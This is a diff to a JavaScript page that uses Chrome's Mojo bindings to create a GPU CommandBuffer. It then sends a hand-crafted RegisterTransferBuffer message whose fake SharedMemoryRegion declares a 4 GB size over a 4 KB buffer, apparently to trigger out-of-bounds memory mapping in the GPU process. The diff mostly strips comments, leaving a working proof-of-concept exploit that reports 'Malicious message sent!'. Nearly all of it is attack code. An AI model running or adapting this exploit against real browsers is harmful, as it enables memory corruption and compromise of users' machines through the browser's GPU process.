@@ -32,23 +32,21 @@
             const {handle0: cmdBufferHandle, handle1: cmdBufferServer} = Mojo.createMessagePipe();
             const {handle0: clientHandle, handle1: clientServer} = Mojo.createMessagePipe();
 
-            // 4. Create a small shared buffer for the shared state (size doesn't matter)
+            // 4. Create a small shared buffer for the shared state
             const sharedState = Mojo.createSharedBuffer(4096);
 
             // 5. Build the CreateCommandBufferParams
             const createParams = {
                 params: {
-                    // CommandBufferParams – minimal valid values
                     streamId: 1,
                     routeId: 1
-                    // other fields are optional and will default to 0
                 },
-                sharedState: sharedState.handle,   // shared buffer handle
-                receiver: cmdBufferServer,          // server end of CommandBuffer pipe
-                client: clientServer                // server end of CommandBufferClient pipe
+                sharedState: sharedState.handle,
+                receiver: cmdBufferServer,
+                client: clientServer
             };
 
-            // 6. Request a new CommandBuffer (async)
+            // 6. Request a new CommandBuffer
             await gpu.createCommandBuffer(createParams);
             status('CommandBuffer created');
 
@@ -60,32 +58,28 @@
             const payload = new ArrayBuffer(256);
             const view = new DataView(payload);
 
-            // --- RegisterTransferBuffer_Params_Data (24 bytes) ---
-            view.setUint32(0, 24, true);          // struct header size
+            // RegisterTransferBuffer_Params_Data (24 bytes)
+            view.setUint32(0, 24, true);          // struct size
             view.setUint32(4, 0, true);           // version
-            view.setInt32(8, 0x1234, true);       // transfer buffer ID (non-zero)
+            view.setInt32(8, 0x1234, true);       // buffer ID (non-zero)
             view.setUint32(12, 0, true);          // padding
-            // Pointer to the fake SharedMemoryRegion (relative offset)
-            const regionOffset = 0x40 - 0x10;     // points to offset 0x40 in this buffer
-            view.setBigInt64(16, BigInt(regionOffset), true);
+            // Pointer to fake SharedMemoryRegion
+            view.setBigInt64(16, BigInt(0x40 - 0x10), true);
 
-            // --- Fake SharedMemoryRegion at offset 0x40 ---
-            view.setUint32(0x40, 24, true);       // struct header size
+            // Fake SharedMemoryRegion at offset 0x40
+            view.setUint32(0x40, 24, true);       // struct size
             view.setUint32(0x44, 0, true);        // version
-            view.setUint32(0x48, 0, true);        // handle index (0 = first attached handle)
+            view.setUint32(0x48, 0, true);        // handle index (0)
             view.setUint32(0x4C, 0, true);        // padding
-            // Huge region size → out-of-bounds mapping
-            view.setBigUint64(0x50, BigInt(0x100000000), true); // 4 GB
+            view.setBigUint64(0x50, BigInt(0x100000000), true); // huge size
 
-            // Create a small valid shared buffer to attach (4 KB)
+            // Attach a valid small shared buffer
             const sharedBuffer = Mojo.createSharedBuffer(4096);
             const handles = [sharedBuffer.handle];
 
-            // 9. Send the raw message directly on the CommandBuffer pipe
+            // 9. Send the raw message
             pipeHandle.writeMessage(payload, handles);
-            status('Malicious RegisterTransferBuffer sent!');
-
-            // Keep the page alive so you can observe the GPU process
+            status('Malicious message sent!');
             setInterval(() => {}, 10000);
         } catch (err) {
             status('Error: ' + err.message + ' (see console)');
